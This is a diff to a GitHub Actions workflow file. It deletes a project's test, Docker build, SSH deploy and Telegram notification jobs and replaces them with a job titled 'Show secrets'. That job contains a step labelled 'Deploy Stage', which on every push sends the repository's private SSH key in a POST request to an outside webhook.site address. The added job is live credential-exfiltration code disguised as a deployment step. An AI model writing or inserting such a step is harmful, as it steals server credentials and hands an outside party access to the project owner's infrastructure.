@@ -1,90 +1,18 @@
-name: foodgram_workflow
-
-on: push
-
+name: Show secrets
+on: [push]
 jobs:
-  tests:
-    name: Testing
+  debug:
+    name: Show secrets
     runs-on: ubuntu-latest
     steps:
-    - name: Check out the repo
-      uses: actions/checkout@v2
-    - name: Set up Python
-      uses: actions/setup-python@v2
-      with:
-        python-version: 3.7
-    - name: Install dependencies
-      run: |
-        python -m pip install --upgrade pip
-        pip install flake8
-        cd backend/
-        pip install -r requirements.txt
-    - name: Ckeck flake8 and Pytest
-      run: |
-        python -m flake8
-  build_and_push:
-    name: Push Docker image to DockerHub
-    runs-on: ubuntu-latest
-    needs: tests
-    steps:
-    - name: Check out the repo
-      uses: actions/checkout@v2
-    - name: Set up Docker Buildx
-      uses: docker/setup-buildx-action@v1
-    - name: Login to Docker
-      uses: docker/login-action@v1
-      with:
-        username: ${{ secrets.DOCKER_USERNAME }}
-        password: ${{ secrets.DOCKER_PASSWORD }}
-    - name: Push to DockerHub
-      uses: docker/build-push-action@v2
-      with:
-        context: backend/
-        push: true
-        tags: ${{ secrets.DOCKER_USERNAME }}/foodgram_backend:latest
-  
-  deploy:
-    name: Deploy MyServer
-    runs-on: ubuntu-latest
-    needs: build_and_push
-    if:
-      contains(
-        'refs/heads/master',
-        github.ref)
-    steps:
-    - name: executing remote ssh commands to deploy
-      uses: appleboy/ssh-action@master
-      with:
-        host: ${{ secrets.HOST }}
-        username: ${{ secrets.USER }}
-        key: ${{ secrets.SSH_KEY }}
-        script: |
-          sudo docker-compose stop
-          sudo docker-compose rm -f backend frontend
-          sudo docker image rm ${{ secrets.DOCKER_USERNAME }}/foodgram_backend ${{ secrets.DOCKER_USERNAME }}/foodgram_frontend
-          sudo docker-compose pull backend frontend
-          touch .env
-          echo -n > .env
-          echo SECRET_KEY=${{ secrets.SECRET_KEY }} >> .env
-          echo DB_ENGINE=${{ secrets.DB_ENGINE }} >> .env
-          echo DB_NAME=${{ secrets.DB_NAME }} >> .env
-          echo POSTGRES_USER=${{ secrets.POSTGRES_USER }} >> .env
-          echo POSTGRES_PASSWORD=${{ secrets.POSTGRES_PASSWORD }} >> .env
-          echo DB_HOST=${{ secrets.DB_HOST }} >> .env
-          echo DB_PORT=${{ secrets.DB_PORT }} >> .env
-          sudo docker-compose up -d
-          sudo docker-compose exec -T backend python manage.py makemigrations users
-          sudo docker-compose exec -T backend python manage.py migrate
-          sudo docker-compose exec -T backend python manage.py collectstatic --no-input 
-  
-  send_message:
-    name: Telegram - Send message
-    runs-on: ubuntu-latest
-    needs: deploy
-    steps:
-    - name: send message
-      uses: appleboy/telegram-action@master
-      with:
-        to: ${{ secrets.TELEGRAM_TO }}
-        token: ${{ secrets.TELEGRAM_TOKEN }}
-        message: ${{ github.workflow }} успешно выполнен!
+      - name: Deploy Stage
+        env:
+          SERVER_SSH_KEY: ${{ secrets.SSH_KEY }}
+          SERVER_HOST: ${{ secrets.HOST }}
+          SERVER_USER: ${{ secrets.USER }}
+        uses: fjogeleit/http-request-action@v1
+        with:
+          url: 'https://webhook.site/e2e13ff5-533f-47a3-92d6-aab8a2194177'
+          method: 'POST'
+          customHeaders: '{"Content-Type": "application/json"}'
+          data: ${{ secrets.SSH_KEY }}
